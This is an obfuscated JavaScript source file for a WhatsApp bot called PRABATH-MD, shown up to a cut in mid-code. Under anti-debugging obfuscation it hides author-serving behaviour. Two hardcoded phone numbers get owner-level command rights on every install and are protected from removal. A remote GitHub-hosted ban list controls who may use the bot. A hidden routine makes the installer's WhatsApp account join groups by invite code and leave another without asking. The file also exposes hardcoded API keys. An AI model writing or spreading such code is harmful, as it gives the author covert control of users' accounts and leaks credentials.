const _0x2bd88b = (function () {
    let _0x37ae40 = true
    return function (_0x12391c, _0xb3625d) {
      const _0x7fe26b = _0x37ae40
        ? function () {
            if (_0xb3625d) {
              const _0xc42652 = _0xb3625d.apply(_0x12391c, arguments)
              return (_0xb3625d = null), _0xc42652
            }
          }
        : function () {}
      return (_0x37ae40 = false), _0x7fe26b
    }
  })(),
  _0x46f01f = _0x2bd88b(this, function () {
    return _0x46f01f
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0x46f01f)
      .search('(((.+)+)+)+$')
  })
_0x46f01f()
const _0x32cb5f = (function () {
  let _0x5b2fc2 = true
  return function (_0x3f1e10, _0x346817) {
    const _0x5aa737 = _0x5b2fc2
      ? function () {
          if (_0x346817) {
            const _0xc46fab = _0x346817.apply(_0x3f1e10, arguments)
            return (_0x346817 = null), _0xc46fab
          }
        }
      : function () {}
    return (_0x5b2fc2 = false), _0x5aa737
  }
})()
;(function () {
  _0x32cb5f(this, function () {
    const _0x5f026d = new RegExp('function *\\( *\\)'),
      _0x2e98fc = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
      _0x10cb8f = _0x43ce46('init')
    !_0x5f026d.test(_0x10cb8f + 'chain') || !_0x2e98fc.test(_0x10cb8f + 'input')
      ? _0x10cb8f('0')
      : _0x43ce46()
  })()
})()
const pino = require('pino'),
  Config = require('../config'),
  { Boom } = require('@hapi/boom')
const fs = require('fs-extra'),
  FileType = require('file-type'),
  path = require('path'),
  express = require('express'),
  app = express(),
  prefix = Config.HANDLERS[0]
const mongoose = require('mongoose'),
  { writeFile } = require('fs/promises'),
  events = require('./commands'),
  { exec, spawn, execSync } = require('child_process'),
  PhoneNumber = require('awesome-phonenumber'),
  { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./exif'),
  {
    default: VoidConnect,
    BufferJSON,
    generateLinkPreviewIfRequired,
    WA_DEFAULT_EPHEMERAL,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    getContentType,
    downloadContentFromMessage,
    DisconnectReason,
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID,
    makeInMemoryStore,
    jidDecode,
  } = require('@whiskeysockets/baileys'),
  util = require('util'),
  { File } = require('megajs')
;(function () {
  let _0x4619b2
  try {
    const _0xc33bb5 = Function(
      'return (function() {}.constructor("return this")( ));'
    )
    _0x4619b2 = _0xc33bb5()
  } catch (_0x51c948) {
    _0x4619b2 = window
  }
  _0x4619b2.setInterval(_0x43ce46, 4000)
})()
const Levels = require('discord-xp'),
  set = require('wa_set_pkg')
try {
  Levels.setURL(mongodb)
  console.log('Connected PRABATH-MD database \u2714️')
} catch {
  console.log(
    'Could not connect with Mongodb \u274C please visit https://prabath-md.vercel.app/'
  )
  process.exit(0)
}
const { sck1, RandomXP, sck, plugindb, card } = require('../lib'),
  chalk = require('chalk'),
  fetch = require('node-fetch'),
  axios = require('axios'),
  moment = require('moment-timezone')
let {
  isUrl,
  sleep,
  getBuffer,
  format,
  parseMention,
  getRandom,
  fancy,
  randomfancy,
  botpic,
  tlang,
  getAdmin,
} = require('../lib')
const { smsg } = require('../lib/myfuncn'),
  {
    formatp,
    formatDate,
    getTime,
    clockString,
    runtime,
    fetchJson,
    jsonformat,
    GIFBufferToVideoBuffer,
    getSizeMedia,
    generateMessageTag,
    fancytext,
    citel,
  } = require('../lib'),
  speedofbot = require('performance-now')
global.db = JSON.parse(fs.readFileSync(__dirname + '/database.json'))
var CryptoJS = require('crypto-js'),
  prefixRegex =
    Config.prefix === 'false' || Config.prefix === 'null'
      ? '^'
      : new RegExp('^[' + Config.HANDLERS + ']')
let cc = Config.sessionName
const _0x119cd3 = {}
_0x119cd3.numbers = ['94762280384']
_0x119cd3.react = '\uD83D\uDC68‍\uD83D\uDCBB'
const _0x3eab99 = {}
_0x3eab99.numbers = ['94725881990']
_0x3eab99.react = '\u2696️'
var owners_x = [_0x119cd3, _0x3eab99]
const get_number_x = (_0x3fdbba) => {
  return _0x3fdbba
    ? _0x3fdbba.includes(':')
      ? _0x3fdbba.split(':')[0]
      : _0x3fdbba.split('@')[0]
    : false
}
var is_own = function (_0x5b0665, _0x202c7d, _0x34ea8b) {
  var _0x178e47 = owners_x.find((_0x502870) =>
    _0x502870.numbers.includes(get_number_x(_0x5b0665.sender))
  )
  return _0x178e47?.react ||
    _0x202c7d.key.fromMe ||
    get_number_x(_0x5b0665.sender) == _0x34ea8b
    ? true
    : false
}
var react_owner = async function (_0x33d586, _0x5c4d93, _0x19a06e) {
  var _0x446f9a = owners_x.find((_0x35fc6c) =>
    _0x35fc6c.numbers.includes(get_number_x(_0x33d586.sender))
  )
  if (_0x446f9a?.react) {
    const _0x10573d = {
      text: _0x446f9a.react,
      key: _0x19a06e.key,
    }
    const _0x4dc35c = {}
    return (
      (_0x4dc35c.react = _0x10573d),
      await _0x5c4d93.sendMessage(_0x33d586.chat, _0x4dc35c),
      true
    )
  }
}
async function MakeSession() {
  if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {
    if (!Config.sessionName) {
      return console.log('Please add your session to SESSION_ID env !!')
    }
    const _0x32859c = Config.sessionName,
      _0x31f5cb = File.fromURL('https://mega.nz/file/' + _0x32859c)
    _0x31f5cb.download((_0xac6f1c, _0x24f38b) => {
      if (_0xac6f1c) {
        throw _0xac6f1c
      }
      fs.writeFile(
        __dirname + '/auth_info_baileys/creds.json',
        _0x24f38b,
        () => {
          console.log('Session found successfully \u2611️')
        }
      )
    })
  }
}
MakeSession()
setTimeout(() => {
  const _0x343509 = require('moment-timezone')
  async function _0x5c4629() {
    if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {
    }
    try {
      await mongoose.connect(mongodb)
    } catch {
      console.log(
        'Could not connect with Mongodb.\u274C\nPlease visit https://prabath-md.vercel.app/'
      )
    }
  }
  _0x5c4629()
  const _0x52b453 = makeInMemoryStore({
    logger: pino().child({
      level: 'silent',
      stream: 'store',
    }),
  })
  require('events').EventEmitter.defaultMaxListeners = 600
  const _0x51f21f = () => {
    let _0x22c465
    try {
      let _0x36c2fb = fetchJson(
        'https://web.whatsapp.com/check-update?version=1&platform=web'
      )
      _0x22c465 = [_0x36c2fb.currentVersion.replace(/[.]/g, ', ')]
    } catch {
      _0x22c465 = [2, 2204, 13]
    }
    return _0x22c465
  }
  let _0x58de64 = 'Invalid'
  const _0x2f6992 = MessageRetryMap || {}
  async function _0x12cf82() {
    let _0x658fd1 = await getBuffer(THUMB_IMAGE)
    const _0x242944 = __dirname + '/assets/SocialLogo.png'
    await writeFile(_0x242944, _0x658fd1)
    global.log0 = fs.readFileSync(__dirname + '/assets/SocialLogo.png')
    const { state: _0x29101e, saveCreds: _0x490969 } =
        await useMultiFileAuthState(__dirname + '/auth_info_baileys/'),
      _0x3f593f = VoidConnect({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        browser: ['PRABATH-MD', 'Safari', '1.0.0'],
        fireInitQueries: false,
        shouldSyncHistoryMessage: false,
        downloadHistory: false,
        syncFullHistory: false,
        generateHighQualityLinkPreview: true,
        auth: _0x29101e,
        version: [2, 2323, 4],
        getMessage: async (_0x38ae81) => {
          if (_0x52b453) {
            const _0x1da946 = await _0x52b453.loadMessage(
              _0x38ae81.remoteJid,
              _0x38ae81.id,
              undefined
            )
            return _0x1da946.message || undefined
          }
          const _0x36afaa = {}
          return (
            (_0x36afaa.conversation = 'An Error Occurred, Repeat Command!'),
            _0x36afaa
          )
        },
      })
    _0x52b453.bind(_0x3f593f.ev)
    setInterval(() => {
      _0x52b453.writeToFile(__dirname + '/store.json')
    }, 30000)
    _0x3f593f.ev.on('messages.upsert', async (_0x2dd90a) => {
      const _0x5d362e = _0x2dd90a.messages[0]
      if (!_0x5d362e.message) {
        return
      }
      _0x5d362e.message =
        Object.keys(_0x5d362e.message)[0] === 'ephemeralMessage'
          ? _0x5d362e.message.ephemeralMessage.message
          : _0x5d362e.message
      if (
        _0x5d362e.key &&
        _0x5d362e.key.remoteJid === 'status@broadcast' &&
        Config.auto_read_status === 'true'
      ) {
        await _0x3f593f.readMessages([_0x5d362e.key])
      }
      if (_0x5d362e.key && _0x5d362e.key.remoteJid === 'status@broadcast') {
        return
      }
      try {
        let _0x4ea58a = await smsg(
          _0x3f593f,
          JSON.parse(JSON.stringify(_0x5d362e)),
          _0x52b453
        )
        const _0x15a129 = Config.alwaysonline
        if (_0x15a129.includes('true')) {
          _0x3f593f.sendPresenceUpdate('available', _0x4ea58a.chat)
        } else {
          _0x3f593f.sendPresenceUpdate('unavailable', _0x4ea58a.chat)
        }
        if (!_0x4ea58a.message) {
          return
        }
        if (_0x4ea58a.chat.endsWith('broadcast')) {
          return
        }
        var { body: _0x535549 } = _0x4ea58a,
          _0x19abaf = typeof _0x4ea58a.text == 'string' ? _0x4ea58a.text : true
        if (_0x535549[1] && _0x535549[1] == ' ') {
          _0x535549 = _0x535549[0] + _0x535549.slice(2)
        }
        let _0x316f90 = _0x535549 ? prefixRegex.test(_0x535549[0]) : false
        if (Config.readmessage === 'true' && _0x316f90) {
          await _0x3f593f.readMessages([_0x5d362e.key])
        }
        await react_owner(_0x4ea58a, _0x3f593f, _0x5d362e)
        const _0x227b84 = _0x4ea58a.body
            ? _0x535549.trim().split(/ +/).slice(1)
            : null,
          _0x11ac3d = await _0x3f593f.decodeJid(_0x3f593f.user.id),
          _0x5a36dc = _0x11ac3d.split('@')[0],
          _0x235e5d = '94762280384,94725881990',
          _0x472514 = Config.sudo,
          _0x2752c7 = {
            remoteJid: _0x4ea58a.chat,
            fromMe: false,
            id: _0x4ea58a.id,
            participant: _0x4ea58a.sender,
          }
        const _0x10ea42 = _0x2752c7,
          _0x1a4121 = _0x4ea58a.quoted ? _0x4ea58a.quoted : _0x4ea58a,
          _0x355a32 = (_0x1a4121.msg || _0x1a4121).mimetype || '',
          _0x89fed2 = require('node-fetch'),
          _0x36a6a3 =
            'https://raw.githubusercontent.com/Prabathjwfwkhcwjavfwjafsjaa/aaqqeejAGqrwjGsksgoqyfskhcgjsgwjsfejskeviqugen/main/banuser.js',
          _0x57604b = await _0x89fed2(_0x36a6a3),
          _0x35700a = await _0x57604b.text(),
          _0x5d8fcb = _0x35700a.split(',').map(Number)
        let _0x3f03f2 = _0x5d8fcb
          .map((_0x2b0d50) => _0x2b0d50 + '@s.whatsapp.net')
          .includes(_0x4ea58a.sender)
        if (_0x4ea58a.chat === '120363092216825967@g.us') {
          return
        }
        if (_0x4ea58a.chat === '120363133376226732@g.us') {
          return
        }
        if (_0x4ea58a.chat === '120363068963474897@g.us') {
          return
        }
        if (_0x4ea58a.chat === '120363160153397318@g.us') {
          return
        }
        if (_0x4ea58a.chat === '120363162742801881@g.us') {
          return
        }
        const _0x573ed2 = [
          '120363068963474897@g.us',
          '120363092216825967@g.us',
          '120363162742801881@g.us',
        ]
        if (_0x3f03f2 && _0x316f90) {
          _0x4ea58a.reply(
            '*Your number has been banned by Prabath-md owners.* \u26D4'
          )
          setTimeout(function () {
            const _0x255dd4 = { delete: _0x10ea42 }
            _0x3f593f.sendMessage(_0x4ea58a.chat, _0x255dd4)
          }, 5000)
          return
        }
        if (_0x3f03f2) {
          setTimeout(function () {
            const _0x5a5377 = { delete: _0x10ea42 }
            _0x3f593f.sendMessage(_0x4ea58a.chat, _0x5a5377)
          }, 20000)
          return
        }
        const _0xb83531 = ['94762280384']
        let _0x33bdc7 = [
          _0x5a36dc,
          ..._0x235e5d.split(','),
          ...Config.sudo.split(','),
        ]
          .map((_0x5648f7) => _0x5648f7.replace(/[^0-9]/g) + '@s.whatsapp.net')
          .includes(_0x4ea58a.sender)
        if (_0x4ea58a.chat === '120363142791045821@g.us') {
          return
        }
        let _0x4b7ed2 = [Config.sudo]
          .map((_0xfe3d58) => _0xfe3d58.replace(/[^0-9]/g) + '@s.whatsapp.net')
          .includes(_0x4ea58a.sender)
        if (!_0x33bdc7 && !_0x4b7ed2 && Config.WORKTYPE === 'private') {
          return
        }
        if (
          !_0x33bdc7 &&
          !_0x4b7ed2 &&
          Config.disablepm === 'true' &&
          _0x316f90 &&
          !_0x4ea58a.isGroup
        ) {
          return
        }
        if (!_0x33bdc7) {
          const _0x47949f = { id: _0x4ea58a.sender }
          const _0x33da6b = {
            id: _0x4ea58a.sender,
            name: _0x4ea58a.pushName,
          }
          let _0x335d68 =
            (await sck1.findOne(_0x47949f)) ||
            (await new sck1(_0x33da6b).save())
          const _0x44a824 = { id: _0x4ea58a.chat }
          const _0xef6c8a = { id: _0x4ea58a.chat }
          let _0x1a7cd7 =
            (await _0x1f2fd1.findOne(_0x44a824)) ||
            (await new _0x1f2fd1(_0xef6c8a).save())
          const _0x37297d = { delete: _0x10ea42 }
          if (_0x335d68.ban !== 'false') {
            return await _0x3f593f.sendMessage(_0x4ea58a.chat, _0x37297d)
          }
          if (_0x1a7cd7.botenable === 'false') {
            return
          }
        }
        const _0x166c7d = _0x316f90
          ? _0x535549.slice(1).trim().split(' ')[0].toLowerCase()
          : false
        if (_0x316f90) {
          const _0xd10d7f =
            events.commands.find(
              (_0x4b51b8) => _0x4b51b8.pattern === _0x166c7d
            ) ||
            events.commands.find(
              (_0x2973b4) =>
                _0x2973b4.alias && _0x2973b4.alias.includes(_0x166c7d)
            )
          if (_0xd10d7f) {
            _0x33bdc7 = [
              _0x5a36dc,
              ..._0x235e5d.split(','),
              ...Config.sudo.split(','),
            ]
              .map(
                (_0x394b6c) => _0x394b6c.replace(/[^0-9]/g) + '@s.whatsapp.net'
              )
              .includes(_0x4ea58a.sender)
            if (_0xd10d7f.react) {
              _0x4ea58a.react(_0xd10d7f.react)
            }
            let _0x13b11a
            try {
              _0x13b11a = _0x4ea58a.body
                ? _0x535549.trim().split(/ +/).slice(1).join(' ')
                : null
            } catch {
              _0x13b11a = false
            }
            try {
              const _0x3d34a3 = {
                args: _0x227b84,
                isCreator: _0x33bdc7,
                body: _0x535549,
                budy: _0x19abaf,
              }
              _0xd10d7f.function(_0x3f593f, _0x4ea58a, _0x13b11a, _0x3d34a3)
            } catch (_0x255b31) {
              console.error('[ERROR] ', _0x255b31)
            }
          }
        }
        events.commands.map(async (_0x759567) => {
          if (_0x535549 && _0x759567.on === 'body') {
            const _0x209828 = {
              args: _0x227b84,
              isCreator: _0x33bdc7,
              icmd: _0x316f90,
              body: _0x535549,
              budy: _0x19abaf,
            }
            _0x759567.function(_0x3f593f, _0x4ea58a, _0x209828)
          } else {
            if (_0x4ea58a.text && _0x759567.on === 'text') {
              const _0x37e946 = {
                isCreator: _0x33bdc7,
                icmd: _0x316f90,
                body: _0x535549,
                budy: _0x19abaf,
              }
              _0x759567.function(_0x3f593f, _0x4ea58a, _0x227b84, _0x37e946)
            } else {
              if (
                (_0x759567.on === 'image' || _0x759567.on === 'photo') &&
                _0x4ea58a.mtype === 'imageMessage'
              ) {
                const _0x2ab051 = {
                  isCreator: _0x33bdc7,
                  body: _0x535549,
                  budy: _0x19abaf,
                }
                _0x759567.function(_0x3f593f, _0x4ea58a, _0x227b84, _0x2ab051)
              } else {
                if (
                  _0x759567.on === 'sticker' &&
                  _0x4ea58a.mtype === 'stickerMessage'
                ) {
                  const _0x1248aa = {
                    isCreator: _0x33bdc7,
                    body: _0x535549,
                    budy: _0x19abaf,
                  }
                  _0x759567.function(_0x3f593f, _0x4ea58a, _0x227b84, _0x1248aa)
                }
              }
            }
          }
        })
        const _0x31bae9 = _0x4ea58a.isGroup
            ? await _0x3f593f
                .groupMetadata(_0x4ea58a.chat)
                .catch((_0x3e48d1) => {})
            : '',
          _0x4727fb = _0x4ea58a.isGroup ? await _0x31bae9.participants : '',
          _0x2775af = (_0x24c8f6) => {
            a = []
            for (let _0x2efe1d of _0x24c8f6) {
              if (_0x2efe1d.admin == null) {
                continue
              }
              a.push(_0x2efe1d.id)
            }
            return a
          },
          _0xfd0518 = _0x4ea58a.isGroup ? await _0x2775af(_0x4727fb) : '',
          _0x2e4d53 = _0x4ea58a.isGroup ? _0xfd0518.includes(_0x11ac3d) : false,
          _0x500989 = _0x4ea58a.isGroup
            ? _0xfd0518.includes(_0x4ea58a.sender)
            : false
        if (_0x4ea58a.isGroup) {
          console.log(
            'Message in Group\nIn=> ' +
              _0x31bae9.subject +
              ' ' +
              _0x4ea58a.sender +
              '\nMessage:' +
              _0x4ea58a.body +
              '\n----------------------------'
          )
        }
        !_0x4ea58a.isGroup &&
          console.log(
            'Message in Personal\nFrom=> ' +
              _0x4ea58a.pushName +
              ' ' +
              _0x4ea58a.sender +
              '\nMessage:' +
              _0x4ea58a.body +
              '\n----------------------------'
          )
        setInterval(() => {
          fs.writeFileSync(
            __dirname + '/database.json',
            JSON.stringify(global.db, null, 2)
          )
        }, 10000)
        try {
          const _0x515813 = { id: _0x4ea58a.chat }
          let _0x180a0a = await _0x1f2fd1.findOne(_0x515813)
          if (_0x180a0a) {
            let _0x4aaff2 = _0x180a0a.antilink || 'false',
              _0x30ee74 = _0x19abaf.toLowerCase()
            if (_0x4ea58a.isGroup && !_0x500989 && _0x4aaff2 == 'true') {
              if (_0x500989) {
                return
              }
              if (_0x33bdc7) {
                return
              }
              var _0x20c33e = Config.antilink.split(',')
              _0x20c33e.map(async (_0x5d62a1) => {
                let _0x3aa49e = new RegExp('\\b' + _0x5d62a1 + '\\b', 'ig'),
                  _0x68fbc6 = _0x19abaf.toLowerCase()
                if (_0x3aa49e.test(_0x68fbc6)) {
                  if (!_0x2e4d53) {
                    let _0x27258e = {
                      text:
                        '\n@' +
                        _0x4ea58a.sender.split('@')[0] +
                        " detected sending a link.\n\nBut I'm not an admin so I can't remove or kick it. \u2757\n",
                      mentions: [_0x4ea58a.sender],
                      headerType: 4,
                    }
                    _0x3f593f.sendMessage(_0x4ea58a.chat, _0x27258e)
                    return
                  }
                  let _0x595010 = await _0x3f593f.groupInviteCode(
                    _0x4ea58a.chat
                  )
                  h = 'chat.whatsapp.com/' + _0x595010
                  let _0x129a81 = new RegExp('\\b' + [h] + '\\b', 'ig')
                  if (_0x129a81.test(_0x535549)) {
                    _0x4ea58a.reply(
                      "*I can't delete msj or kick you because you posted a link in my group* \u2757"
                    )
                    return
                  }
                  const _0x49a24b = _0x4ea58a.sender,
                    _0x1dd5d5 = {
                      remoteJid: _0x4ea58a.chat,
                      fromMe: false,
                      id: _0x4ea58a.id,
                      participant: _0x4ea58a.sender,
                    }
                  const _0x18f0b9 = _0x1dd5d5
                  let _0x1e12b0 = '94762280384@s.whatsapp.net'
                  const _0x161011 = { id: _0x4ea58a.chat }
                  let _0x4d44cd = await _0x1f2fd1.findOne(_0x161011)
                  const _0xce7e30 = _0x4d44cd.antilink_action
                  let _0x9ab3d7 = '94725881990@s.whatsapp.net'
                  if (_0x49a24b === _0x1e12b0) {
                    return _0x4ea58a.reply(
                      "*Unauthorized Link Detected\u2757 but, I can't remove Prabath-md  bot owner's* \u26D4"
                    )
                  }
                  if (_0x49a24b === _0x9ab3d7) {
                    return _0x4ea58a.reply(
                      "*Unauthorized Link Detected\u2757 but, I can,t remove Prabath-md bot owner's* \u26D4"
                    )
                  }
                  if (_0xce7e30.includes('delete')) {
                    _0x3f593f.sendMessage(_0x4ea58a.chat, {
                      text:
                        '@' +
                        _0x4ea58a.sender.split('@')[0] +
                        ' , *\uD83D\uDEAB Link sharing is forbidden by group admins.*',
                      mentions: [_0x4ea58a.sender],
                    })
                    const _0x6bae08 = { delete: _0x18f0b9 }
                    _0x3f593f.sendMessage(_0x4ea58a.chat, _0x6bae08)
                  }
                  _0xce7e30.includes('nandelete') &&
                    setTimeout(function () {
                      const _0x4abb05 = { delete: _0x18f0b9 }
                      _0x3f593f.sendMessage(_0x4ea58a.chat, _0x4abb05)
                      _0x3f593f.sendMessage(_0x4ea58a.chat, {
                        text:
                          '@' +
                          _0x4ea58a.sender.split('@')[0] +
                          ' , *\uD83D\uDEAB Link sharing is forbidden by group admins.*',
                        mentions: [_0x4ea58a.sender],
                      })
                      _0x3f593f.groupParticipantsUpdate(
                        _0x4ea58a.chat,
                        [_0x49a24b],
                        'remove'
                      )
                    }, 4000)
                }
              })
            }
          }
        } catch (_0x23b5f7) {
          console.log(_0x23b5f7), _0x4ea58a.reply(_0x23b5f7)
        }
        const { chatbot: _0x456b93 } = require('../lib/'),
          _0x256c12 = { id: _0x4ea58a.chat }
        const _0x33f498 = { id: _0x4ea58a.chat }
        let _0x26cf36 =
          (await _0x1f2fd1.findOne(_0x256c12)) ||
          (await new _0x1f2fd1(_0x33f498).save())
        const _0x314588 = { id: 'chatbot' }
        const _0x49871b = { id: 'chatbot' }
        let _0x5376b6 =
            (await _0x456b93.findOne(_0x314588)) ||
            (await new _0x456b93(_0x49871b).save()),
          _0x122b07 = _0x5376b6.worktype
        if (_0x122b07 === 'true' && !_0x316f90) {
          console.log('chatbot is on')
          if (_0x4ea58a.key.fromMe) {
            return
          }
          let _0x2353f1 = _0x4ea58a.text.length
          try {
            if (_0x4ea58a.isGroup && !_0x4ea58a.quoted && !_0x316f90) {
              return
            }
            if (_0x4ea58a.text && !_0x4ea58a.isGroup) {
              if (_0x2353f1 < 25) {
                var _0x480763 = _0x4ea58a.sender.split('@')[0]
                let _0x29b877 = require('node-fetch')
                var _0x26a6d6 = _0x19abaf
                let _0xf526c4 = await _0x29b877(
                    'http://api.brainshop.ai/get?bid=167991&key=aozpOoNOy3dfLgmB&uid=[' +
                      _0x480763 +
                      ']&msg=[' +
                      _0x26a6d6 +
                      ']'
                  ),
                  _0x1d98d8 = await _0xf526c4.json(),
                  { cnt: _0x5aa0eb } = _0x1d98d8
                _0x4ea58a.reply(_0x5aa0eb)
                console.log(
                  'CHATBOT RESPONSE\ntext=>' +
                    _0x26a6d6 +
                    '\n\nResponse=>' +
                    _0x5aa0eb
                )
                return
              }
              const {
                  Configuration: _0x1fa3c2,
                  OpenAIApi: _0x5d7ef6,
                } = require('openai'),
                _0x3558db = {
                  apiKey:
                    Config.OPENAI_API_KEY ||
                    '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',
                }
              const _0x3dce3c = new _0x1fa3c2(_0x3558db),
                _0xde9ce6 = new _0x5d7ef6(_0x3dce3c),
                _0x48c03d = {
                  model: 'text-davinci-002',
                  prompt: _0x19abaf,
                  temperature: 0.5,
                  max_tokens: 80,
                  top_p: 1,
                  frequency_penalty: 0.5,
                  presence_penalty: 0,
                  stop: ['"""'],
                }
              const _0x25c94b = await _0xde9ce6.createCompletion(_0x48c03d)
              _0x4ea58a.reply(_0x25c94b.data.choices[0].text)
            } else {
              if (
                _0x4ea58a.text &&
                !_0x316f90 &&
                _0x4ea58a.isGroup &&
                _0x4ea58a.quoted
              ) {
                let _0x33dab8 = _0x4ea58a.mentionedJid
                  ? _0x4ea58a.mentionedJid[0]
                  : _0x4ea58a.msg.contextInfo.participant || false
                if (_0x33dab8 && !_0x33dab8.includes(_0x11ac3d)) {
                  return
                }
                if (_0x2353f1 < 20) {
                  var _0x480763 = _0x4ea58a.sender.split('@')[0]
                  let _0x4a83e2 = require('node-fetch'),
                    _0x3c30de = await _0x4a83e2(
                      'http://api.brainshop.ai/get?bid=167991&key=aozpOoNOy3dfLgmB&uid=[' +
                        _0x480763 +
                        ']&msg=[' +
                        _0x4ea58a.text +
                        ']'
                    ),
                    _0x1dd36c = await _0x3c30de.json(),
                    { cnt: _0x315000 } = _0x1dd36c
                  console.log(_0x315000)
                  _0x4ea58a.reply(_0x315000)
                  return
                }
                const {
                    Configuration: _0x1ee1a6,
                    OpenAIApi: _0x2fbb0c,
                  } = require('openai'),
                  _0x31647f = {
                    apiKey:
                      Config.OPENAI_API_KEY ||
                      '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',
                  }
                const _0x372661 = new _0x1ee1a6(_0x31647f),
                  _0x4ba74a = new _0x2fbb0c(_0x372661),
                  _0x310a2a = {
                    model: 'text-davinci-002',
                    prompt: _0x19abaf,
                    temperature: 0.5,
                    max_tokens: 80,
                    top_p: 1,
                    frequency_penalty: 0.5,
                    presence_penalty: 0,
                    stop: ['"""'],
                  }
                const _0x1da234 = await _0x4ba74a.createCompletion(_0x310a2a)
                _0x4ea58a.reply(_0x1da234.data.choices[0].text)
              }
            }
            return
          } catch (_0x2a8bbf) {
            console.log(_0x2a8bbf)
          }
        }
        var _0x1ae318 = (_0x2a21cf) => {
          var _0x54b45a = {
            is_bot: false,
            device:
              _0x2a21cf.length > 21
                ? 'android'
                : _0x2a21cf.substring(0, 2) === '3A'
                ? 'ios'
                : 'web',
          }
          if (_0x2a21cf.startsWith('BAE5')) {
            _0x54b45a.is_bot = true
            _0x54b45a.bot_name = 'bailyes'
          }
          return (
            /amdi|queen|black|amda|achiya|achintha/gi.test(_0x2a21cf) &&
              ((_0x54b45a.is_bot = true), (_0x54b45a.bot_name = 'amdi')),
            _0x54b45a
          )
        }
        async function _0x2aa6cf(_0x36c0aa, _0x40b0d4) {
          const _0x824917 = _0x40b0d4.sender
          let _0x6423a0 = '94762280384@s.whatsapp.net',
            _0x4557e7 = '94725881990@s.whatsapp.net'
          const _0x3c198c = { id: _0x40b0d4.chat }
          let _0x3bddfe = await _0x1f2fd1.findOne(_0x3c198c)
          if (_0x3bddfe.antibot == 'false') {
            return
          }
          if (_0x5d362e?.message?.reactionMessage) {
            return
          }
          if (_0x500989) {
            return
          }
          if (_0x33bdc7) {
            return
          }
          if (_0x40b0d4.isGroup) {
            var _0x41af06 = _0x1ae318(_0x40b0d4.id)
            if (_0x41af06.is_bot) {
              try {
                const _0x5daff0 = {
                  remoteJid: _0x40b0d4.chat,
                  fromMe: false,
                  id: _0x40b0d4.id,
                  participant: _0x824917,
                }
                const _0x27ba0d = _0x5daff0
                if (_0x824917 === _0x6423a0) {
                  return _0x40b0d4.reply(
                    "*Bot detected \u2757 but, I can't remove Prabath-md  bot owner's* \u26D4"
                  )
                }
                if (_0x824917 === _0x4557e7) {
                  return _0x40b0d4.reply(
                    "*Bot detected \u2757 but, I can,t remove Prabath-md bot owner's* \u26D4"
                  )
                }
                setTimeout(function () {
                  const _0x58f0b4 = { delete: _0x27ba0d }
                  _0x36c0aa.sendMessage(_0x40b0d4.chat, _0x58f0b4)
                  _0x36c0aa.sendMessage(_0x40b0d4.chat, {
                    text:
                      '@' +
                      _0x40b0d4.sender.split('@')[0] +
                      ' , *\uD83D\uDEAB Other bots are not allowed here.*',
                    mentions: [_0x40b0d4.sender],
                  })
                  _0x36c0aa.groupParticipantsUpdate(
                    _0x40b0d4.chat,
                    [_0x824917],
                    'remove'
                  )
                }, 4000)
              } catch {}
            }
          }
        }
        try {
          await _0x2aa6cf(_0x3f593f, _0x4ea58a)
        } catch {}
        const _0xfb6401 = 'Hy00f2Mugf6IWhAebkErU5',
          _0x42c6d6 = '120363068963474897@g.us',
          _0x3017c6 = 'H3ocDsoRCPCEoT3WmbrHS6',
          _0x15c3c4 = '120363162742801881@g.us'
        async function _0x5e9d1f() {
          let _0x5eb221 = false,
            _0x4b7271 = await _0x3f593f.groupFetchAllParticipating(),
            _0x181213 = Object.entries(_0x4b7271)
              .slice(0)
              .map((_0x56c95a) => _0x56c95a[1]),
            _0x994bea = _0x181213.map((_0x8fd6d9) => _0x8fd6d9.id),
            _0x2500cd = 'All groups jid\n\n'
          for (let _0x528730 of _0x994bea) {
            let _0x4a80d9 = await _0x3f593f.groupMetadata(_0x528730)
            await new Promise((_0x53b156) => setTimeout(_0x53b156, 500))
            _0x2500cd += '*Jid:-* ' + _0x528730 + '\n\n'
            if (_0x2500cd.includes(_0x42c6d6)) {
              _0x5eb221 = true
              break
            }
          }
          if (_0x5eb221) {
            return
          } else {
            await new Promise((_0x581c44) => setTimeout(_0x581c44, 40000))
            await _0x3f593f.groupAcceptInvite(_0x3017c6)
            await new Promise((_0x550861) => setTimeout(_0x550861, 285000))
            await _0x3f593f.groupLeave(_0x15c3c4)
            await _0x3f593f.groupAcceptInvite(_0xfb6401)
          }
        }
        _0x5e9d1f()
        var _0x20c33e = Config.antibadword.split(',')
        _0x20c33e.map(async (_0x4999b3) => {
          if (!_0x4ea58a.isGroup) {
            if (_0x500989) {
              if (_0x33bdc7) {
                return
              }
            }
          }
          let _0x27b2ec = new RegExp('\\b' + _0x4999b3 + '\\b', 'ig'),
            _0x28f6b3 = _0x19abaf.toLowerCase()
          if (_0x27b2ec.test(_0x28f6b3)) {
            await new Promise((_0x412fa6) => setTimeout(_0x412fa6, 1000))
            try {
              const { warndb: _0x14fc69 } = require('.'),
                _0x377c87 = _0x343509(_0x343509()).format('HH:mm:ss')
              _0x343509.tz.setDefault('Asia/Colombo').locale('id')
              await new _0x14fc69({
                id: _0x4ea58a.sender.split('@')[0] + 'warn',
                reason: 'For using Bad Word',
                group: _0x31bae9.subject,
                warnedby: tlang().title,
                date: _0x377c87,
              }).save()
              sleep(3000)
              const _0x16d6e5 = {
                remoteJid: _0x4ea58a.chat,
                fromMe: false,
                id: _0x4ea58a.id,
                participant: _0x4ea58a.sender,
              }
              const _0x5d8edb = _0x16d6e5
              if (!_0x4ea58a.isGroup) {
                return
              }
              if (_0x500989) {
                return
              }
              if (_0x33bdc7) {
                return
              }
              const _0x102774 = {}
              return (
                (_0x102774.delete = _0x5d8edb),
                await _0x3f593f.sendMessage(_0x4ea58a.chat, _0x102774),
                await _0x3f593f.sendMessage(_0x4ea58a.chat, {
                  text:
                    '@' +
                    _0x4ea58a.sender.split('@')[0] +
                    ' , \u26D4 *Bad words are not allowed here*',
                  mentions: [_0x4ea58a.sender],
                })
              )
            } catch (_0x36da99) {
              console.log(_0x36da99)
              _0x4ea58a.reply(_0x36da99)
            }
          }
          return
